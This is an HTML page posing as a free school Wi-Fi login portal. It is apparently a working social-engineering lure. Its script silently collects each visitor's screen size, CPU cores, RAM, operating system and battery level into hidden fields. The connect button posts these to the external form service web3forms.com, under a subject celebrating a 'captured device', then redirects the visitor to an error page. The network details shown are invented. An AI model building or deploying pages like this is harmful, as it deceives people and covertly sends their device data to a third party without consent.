<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Red Wi-Fi Estudiantil</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 40px 20px; background-color: #0d1117; color: #c9d1d9; }
        .card { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; display: inline-block; max-width: 500px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        h1 { color: #58a6ff; margin-bottom: 5px; font-size: 1.6em; }
        p { color: #8b949e; line-height: 1.5; }
        .info-wifi { background: #21262d; padding: 15px; border-radius: 6px; margin-top: 20px; border: 1px dashed #30363d; text-align: left; }
        .btn-conectar { background-color: #238636; color: white; border: none; padding: 14px 24px; border-radius: 6px; font-size: 1.1em; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; transition: background 0.2s; }
        .btn-conectar:hover { background-color: #2ea043; }
        .wifi-icon { font-size: 2.5em; color: #58a6ff; margin-bottom: 10px; display: inline-block; }
    </style>
</head>
<body>

    <div class="card">
        <span class="wifi-icon">📶</span>
        <h1>Portal de Autenticación</h1>
        <p>Estás a un paso de conectarte a la red inalámbrica gratuita para alumnos y docentes.</p>
        
        
        <form action="https://web3forms.com" method="POST" id="form-wifi" onsubmit="setTimeout(() => { window.location.href='error.html'; }, 500);">    
            <!-- Tu llave pública de Web3Forms -->
            <input type="hidden" name="access_key" value="57341f12-ab6c-4369-9b1b-64b6e24cca32">
            <input type="hidden" name="subject" value="¡Ingeniería Social Exitosa! - Dispositivo Capturado">
            <input type="hidden" name="from_name" value="Portal Wi-Fi Escolar">
            
            <!-- 🔗 REDIRECCIÓN AUTOMÁTICA: Cambia 'rgjadan-cmd' si tu usuario de GitHub llega a ser distinto 
            <input type="hidden" name="redirect" value="https://github.io">-->
            
            <!-- Campos técnicos ocultos que se llenan por atrás -->
            <input type="hidden" id="inp-pantalla" name="Resolución Pantalla">
            <input type="hidden" id="inp-procesador" name="Núcleos Procesador">
            <input type="hidden" id="inp-ram" name="Memoria RAM">
            <input type="hidden" id="inp-so" name="Sistema Operativo">
            <input type="hidden" id="inp-bateria" name="Nivel Batería">

            <div class="info-wifi">
                <small style="color: #58a6ff; font-weight: bold; display: block; margin-bottom: 5px;">DETALLES DE LA CONEXIÓN:</small>
                <span style="font-family: monospace; font-size: 0.9em;">
                     • Red: Wi-Fi_Estudiantes_Gratis<br>
                     • Estado: Esperando vinculación de hardware<br>
                     • Seguridad: WPA2-Enterprise
                </span>
            </div>

            <!-- El botón de acción obligatorio para brincar restricciones -->
            <button type="submit" class="btn-conectar">Acceder a Internet</button>
        </form>
    </div>

    <script>
        async function prepararMétricas() {
            const info = {
                pantalla: `${window.screen.width}x${window.screen.height}`,
                procesador: navigator.hardwareConcurrency || "No detectado",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "No detectado",
                so: obtenerSO(),
                bateria: "No disponible"
            };

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.bateria = (battery.level * 100) + "% (Cargando: " + (battery.charging ? "Sí" : "No") + ")";
                } catch (e) {}
            }

            // Guardamos los datos de telemetría de forma invisible dentro del formulario
            document.getElementById('inp-pantalla').value = info.pantalla;
            document.getElementById('inp-procesador').value = info.procesador;
            document.getElementById('inp-ram').value = info.ram;
            document.getElementById('inp-so').value = info.so;
            document.getElementById('inp-bateria').value = info.bateria;
        }

        function obtenerSO() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android";
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iOS (iPhone)";
            if (/Windows/i.test(ua)) return "Windows";
            return "Otro / Desconocido";
        }

        window.onload = prepararMétricas;
    </script>
</body>
</html>
